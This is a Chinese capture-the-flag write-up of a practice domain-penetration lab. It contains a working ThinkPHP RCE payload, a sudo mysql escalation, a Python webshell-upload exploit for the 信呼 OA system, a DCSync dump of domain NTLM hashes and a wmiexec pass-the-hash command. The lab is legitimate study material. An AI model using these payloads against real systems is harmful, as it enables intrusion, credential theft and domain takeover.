# Initial
!!! note

    春秋云镜中一套简单的域渗透靶场，主要用来熟悉域中的基本渗透流程。
    笔记主要对流程、命令进行记录。

`DCSync`:fontawesome-solid-tag:

## 外围打点&mysql sudo提权

thinkphp 5.0.3 远程命令执行
```
curl "http://39.99.244.32/?s=captcha&test=-1" -d "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1"`
```
```
sudo -l 
Matching Defaults entries for www-data on ubuntu-web01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu-web01:
    (root) NOPASSWD: /usr/bin/mysql
```
```
sudo mysql -e '! cat /root/flag/flag01.txt'
```
```
root@ubuntu-web01:/tmp# cat /root/flag/flag01.txt 
 ██     ██ ██     ██       ███████   ███████       ██     ████     ██   ████████ 
░░██   ██ ░██    ████     ██░░░░░██ ░██░░░░██     ████   ░██░██   ░██  ██░░░░░░██
 ░░██ ██  ░██   ██░░██   ██     ░░██░██   ░██    ██░░██  ░██░░██  ░██ ██      ░░ 
  ░░███   ░██  ██  ░░██ ░██      ░██░███████    ██  ░░██ ░██ ░░██ ░██░██         
   ██░██  ░██ ██████████░██      ░██░██░░░██   ██████████░██  ░░██░██░██    █████
  ██ ░░██ ░██░██░░░░░░██░░██     ██ ░██  ░░██ ░██░░░░░░██░██   ░░████░░██  ░░░░██
 ██   ░░██░██░██     ░██ ░░███████  ░██   ░░██░██     ░██░██    ░░███ ░░████████ 
░░     ░░ ░░ ░░      ░░   ░░░░░░░   ░░     ░░ ░░      ░░ ░░      ░░░   ░░░░░░░░  

Congratulations!!! You found the first flag, the next flag may be in a server in the internal network.

flag01: flag{60b53231-
```
## 内网探测
ssh 代理socks5
??? note "ssh内网代理"
    [内网渗透之代理转发](https://www.secpulse.com/archives/140684.html)
```
ssh -f -N -D 127.0.0.1:7788 root@39.99.244.32
```

```
root@ubuntu-web01:/tmp# ./fscan_386  -h 172.22.0.0/16

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.2
start infoscan
(icmp) Target 172.22.1.15     is alive
(icmp) Target 172.22.1.2      is alive
(icmp) Target 172.22.1.21     is alive
(icmp) Target 172.22.1.18     is alive
(icmp) Target 172.22.255.253  is alive
[*] LiveTop 172.22.0.0/16    段存活数量为: 5
[*] LiveTop 172.22.1.0/24    段存活数量为: 4
[*] Icmp alive hosts len is: 5
[*] LiveTop 172.22.255.0/24  段存活数量为: 1
172.22.1.18:3306 open
172.22.1.2:445 open
172.22.1.18:445 open
172.22.1.21:445 open
172.22.1.21:139 open
172.22.1.2:139 open
172.22.1.18:135 open
172.22.1.21:135 open
172.22.1.2:135 open
172.22.1.18:80 open
172.22.1.2:88 open
172.22.1.18:139 open
[*] alive ports len is: 12
start vulscan
[*] NetInfo:
[*]172.22.1.2
   [->]DC01
   [->]172.22.1.2
[*] 172.22.1.2  (Windows Server 2016 Datacenter 14393)
[+] 172.22.1.21 MS17-010        (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)
[*] NetInfo:
[*]172.22.1.21
   [->]XIAORANG-WIN7
   [->]172.22.1.21
[*] NetInfo:
[*]172.22.1.18
   [->]XIAORANG-OA01
   [->]172.22.1.18
[*] NetBios: 172.22.1.2      [+]DC DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393 
[*] NetBios: 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1 
[*] NetBios: 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600 
[*] WebTitle: http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login
[*] WebTitle: http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统
已完成 12/12
[*] 扫描结束,耗时: 14.826555053s
```

## 信呼协同办公系统

http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统
??? note "信呼协同办公系统 webshell 上传"
    ```py
    import requests
    
    
    session = requests.session()
    
    url_pre = 'http://172.22.1.18/'
    url1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'
    url2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'
    url3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=11'
    
    data1 = {
        'rempass': '0',
        'jmpass': 'false',
        'device': '1625884034525',
        'ltype': '0',
        'adminuser': 'admin',
        'adminpass': 'admin123',
        'yanzm': ''
    }
    
    
    # r = session.post(url1, data=data1)
    r = session.post(url2, files={'file': open('2.php', 'r+')},headers={"Cookie":"""PHPSESSID=m0no0rha86fdfh48tvudeui43q;     deviceid=1699269859036; xinhu_ca_adminuser=admin; xinhu_ca_rempass=0;     xinhu_mo_adminid=jl0pr0xl0mrj0jj0lx0mrd0muu0jj0ll0jj0pl011"""})
    
    print(r.text)
    filepath = str(r.json()['filepath'])
    filepath = "/" + filepath.split('.uptemp')[0] + '.php'
    id = r.json()['id']
    
    url3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'
    
    r = session.get(url3)
    r = session.get(url_pre + filepath + "?1=system('whoami');")
    print(url_pre + filepath + "?1=system('whoami');")
    print(r.text)
    
    ```

```
http://172.22.1.18//upload/2023-11/06_19373422.php

 ___    ___ ___  ________  ________  ________  ________  ________   ________     
|\  \  /  /|\  \|\   __  \|\   __  \|\   __  \|\   __  \|\   ___  \|\   ____\    
\ \  \/  / | \  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \\ \  \ \  \___|    
 \ \    / / \ \  \ \   __  \ \  \\\  \ \   _  _\ \   __  \ \  \\ \  \ \  \  ___  
  /     \/   \ \  \ \  \ \  \ \  \\\  \ \  \\  \\ \  \ \  \ \  \\ \  \ \  \|\  \ 
 /  /\   \    \ \__\ \__\ \__\ \_______\ \__\\ _\\ \__\ \__\ \__\\ \__\ \_______\
/__/ /\ __\    \|__|\|__|\|__|\|_______|\|__|\|__|\|__|\|__|\|__| \|__|\|_______|
|__|/ \|__|                                                                      


flag02: 2ce3-4813-87d4-

Awesome! ! ! You found the second flag, now you can attack the domain controller.
```

## 域渗透

MS17-010 永恒之蓝 打 win7,利用win7的dcsync 权限获取管理员hash

```
meterpreter > kiwi_cmd lsadump::dcsync /all /csv
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] DLL init: proxychains-ng 4.14
[DC] 'xiaorang.lab' will be the domain
[DC] 'DC01.xiaorang.lab' will be the DC server
[DC] Exporting domain 'xiaorang.lab'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        514
1106    Marcus  e07510a4284b3c97c8e7dee970918c5c        512
1107    Charles f6a9881cd5ae709abb4ac9ab87f24617        512
500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        512
1000    DC01$   3d7b0fadfff45c4a7576c8def5df9b94        532480
1104    XIAORANG-OA01$  6e34e436d141d2498d2dff54ffee66d0        4096
1108    XIAORANG-WIN7$  6c3868d13dae5a2ae04061ab7f94e717        4096
```


通过ntml，利用wmiexec获取交互shell
```
proxychains python3 examples/wmiexec.py xiaorang.lab/Administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8  -codec GBK
```